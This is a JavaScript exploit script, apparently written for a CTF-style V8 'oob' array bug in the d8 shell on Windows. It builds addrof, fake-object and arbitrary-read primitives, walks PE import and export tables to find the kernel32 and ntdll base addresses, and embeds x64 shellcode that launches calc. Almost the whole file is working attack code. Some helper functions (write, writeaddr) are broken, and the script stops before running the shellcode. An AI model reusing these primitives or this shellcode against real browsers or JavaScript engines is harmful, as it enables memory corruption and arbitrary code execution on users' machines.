let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

let ab32 = new ArrayBuffer(8);
let fv32 = new Float32Array(ab32);
let dv32 = new BigUint64Array(ab32);

let f2i = (f) =>
{
    fv[0] = f;
	return dv[0];
}

let f2i32 = (f) => 
{
    fv32[0] = f;
    return dv32[0];
}

let i2f = (i) => 
{
    dv[0] = BigInt(i);
    return fv[0];
}

let i2ba = (i) => 
{
    dv[0] = BigInt(i);
    return Array.from(new Uint8Array(ab)).reverse(); 
}

let smi2f = (i) => 
{
	return i2f(parseInt(i.toString(16)+"0".repeat(8),16))
}

let hexprintablei = (i) =>
{
    return "0x"+(i).toString(16).padStart(16,"0");
}

function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }


const shellcode = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00]
const log=print


debug=false;

obj={'yolo':123}
let float_array = [1.1,1.2,1.3];
let packed_array=[obj]

log("[+] Start exploit...");
var float_map=float_array.oob();
var packed_map=packed_array.oob();
log("[+] map double: "+hexprintablei(f2i(float_map)));
log("[+] map packed: "+hexprintablei(f2i(packed_map)));


log("[+] Change packed layout to float layout")
packed_array.oob(float_map);

var fakeit = [float_map, 0, 0, smi2f(0x10000),0].slice(0)

var container = [fakeit];

let addrof = (obj) =>
{
	container[0]=obj;
	container.oob(float_map);
	ret=f2i(container[0]);
	if(debug)log(hexprintablei(ret));
	container.oob(packed_map);
	return ret;
}

leak_addr = addrof(fakeit);
log("[+] fakeit addr: "+hexprintablei(leak_addr));
log("[+] Setup fake obj")
packed_array[0]=i2f(leak_addr-0x28n)
log("[+] Set obj data pointer to itself")
fakeit[2]=i2f(leak_addr);
packed_array.oob(packed_map);

arr = packed_array[0]

let arraybuffer = new ArrayBuffer(1000);
log("[+] arr backstore length corrupted")
log("[+] Getting backstore pointer index")
let idx_size_arraybuffer = arr.indexOf(i2f(1000)); 
let backstore_ptr_idx= idx_size_arraybuffer+1;
log("[+] Setting up R/W primitives")

let a = new DataView(arraybuffer);

let read32 = (addr) =>
{
	arr[backstore_ptr_idx]=i2f(addr);
	if(debug)log(hexprintablei(f2i32(a.getFloat32(0,true))));
	return f2i32(a.getFloat32(0,true)) 
}

let read64 = (addr) =>
{
	arr[backstore_ptr_idx]=i2f(addr);
	if(debug)log(hexprintablei(f2i(a.getFloat64(0,true))));
	return f2i(a.getFloat64(0,true)) 
}

let buf=new DataView(arraybuffer);

let readStr = (addr,tolower=false) =>
{
	arr[backstore_ptr_idx]=i2f(addr);
	str="";
	for(c=0;buf.getUint8(c)!=0;c++)
		str+=String.fromCharCode(buf.getUint8(c));
	return tolower?str.toLowerCase():str;	
}

let write = (idxx, data) =>
{
	a.setUint8(idxx,shellcode[idxx]);
}

let writeaddr = (addr,data) =>
{
	write(ddr,i2ba(data)); 
}

// ----------------------------------------------

let findBinPtr = (heap_addr) =>
{
	let base_addr;
	for(i=0;i<0x80000;i+=8)
	{
		base_addr=read64((heap_addr-BigInt(i))-1n)&0xffffffffffff0000n
		if((base_addr>>36n)==0x7ffn)
				return base_addr;

	}
	return -1;
}

let findBase = (bin_base) =>
{
	for(i=0;i<0x1000000;i+=0x10000)
		if((read32(bin_base-BigInt(i))&0xffffn)==0x5a4dn)
				return bin_base-BigInt(i);
	return -1;
}

let resolve_iat = (dll,funct,base_addr) =>
{
	dll=dll.toLowerCase();
	let data_dir=read32(base_addr+0x3cn);
	let import_dir=read32(base_addr+data_dir+0x90n)+base_addr;
	let iat_size=BigInt(read32(base_addr+data_dir+0xecn));
	let iat_base=read32(import_dir+0x10n)+base_addr;
	let import_dir_size=BigInt(read32(base_addr+data_dir+0x94n));
	let iat_addr,int_addr,int_entry_addr;
	if(debug)
	{
		log("[+] data_dir: "+hexprintablei(data_dir));
		log("[+] import_dir: "+hexprintablei(import_dir));
		log("[+] iat_size: "+hexprintablei(iat_size));
		log("[+] iat_base: "+hexprintablei(iat_base));
		log("[+] import_dir_size: "+hexprintablei(import_dir_size));
	}
	for(i=0;i<=import_dir_size;i+=20)
	{
		name_addr=read32(import_dir+BigInt(i)+12n)+base_addr;
		if(readStr(name_addr,true)==dll)
		{
			iat_addr=read32(import_dir+BigInt(i)+16n)+base_addr;
			int_addr=read32(import_dir+BigInt(i))+base_addr;
			if(debug)
			{
				log("[+] "+dll+" IAT at: "+ hexprintablei(iat_addr));
				log("[+] "+dll+" INT at: "+ hexprintablei(int_addr));
			}
			log("[+] Searching for "+dll+"!"+funct);
			iat_entries=iat_size+iat_base-iat_addr;
			for(j=0;j<=iat_entries;j+=8)
			{
				int_entry_addr=read32(int_addr+BigInt(j))+base_addr;
				if(readStr(int_entry_addr+2n)==funct)
				{
					result=read64(iat_addr+BigInt(j))
					log("[+] "+dll+"!"+funct+" at: " +hexprintablei(result));
					return BigInt(result);
				}
			}
		}
	}
	return -1;
}


let resolve_eat = (dll,funct,base_addr) =>
{
	dll=dll.toLowerCase();
	let data_dir=read32(base_addr+0x3cn);
	let export_dir=read32(base_addr+data_dir+0x88n)+base_addr;
	let eat_addr,ent_addr,ent_entry_addr;
	if(debug)
	{
		log("[+] data_dir: "+hexprintablei(data_dir));
		log("[+] export_dir: "+hexprintablei(export_dir));
	}

	name_addr=read32(export_dir+0xcn)+base_addr;
	
	if(readStr(name_addr,true)==dll)
	{
		eat_addr=read32(export_dir+0x1cn)+base_addr;
		ent_addr=read32(export_dir+0x20n)+base_addr;
		nb_functions=read32(export_dir+0x14n);
		if(debug)
		{
			log("[+] "+dll+" EAT at: "+ hexprintablei(eat_addr));
			log("[+] "+dll+" ENT at: "+ hexprintablei(ent_addr));
		}
		log("[+] Searching for "+dll+"!"+funct);
		for(i=0;i<nb_functions;i++)
		{
			ent_entry_addr=read32(ent_addr+BigInt(i*4))+base_addr;
			if(readStr(ent_entry_addr)==funct)
			{
				result=read32(eat_addr+BigInt(i*4))+base_addr;
				log("[+] "+dll+"!"+funct+" at: " +hexprintablei(result));
				return BigInt(result);
			}
		}
	}
	
	return -1;
}

log("------------------------------------------------------");
log("[+] Resolving d8.exe base address...");

heap=addrof([]);
bin_ptr=findBinPtr(heap);
bin_base=findBase(bin_ptr);

log("[+] Base address d8.exe: "+hexprintablei(bin_base));

kernel32_ptr=resolve_iat('kernel32.dll','CloseHandle',bin_base) & 0xffffffffffff0000n;
resolve_iat('WINMM.dll','timeGetTime',bin_base);
kernel32_base=findBase(kernel32_ptr);
log("[+] Base address kernel32.dll: "+hexprintablei(kernel32_base));

ntdll_ptr=resolve_iat('ntdll.dll','NtTerminateProcess',kernel32_base) & 0xffffffffffff0000n;
ntdll_base=findBase(ntdll_ptr);
log("[+] Base address ntdll.dll: "+hexprintablei(ntdll_base));
beep=resolve_eat('kernel32.dll','Beep',kernel32_base);
log("[+] Beep address: "+hexprintablei(beep));
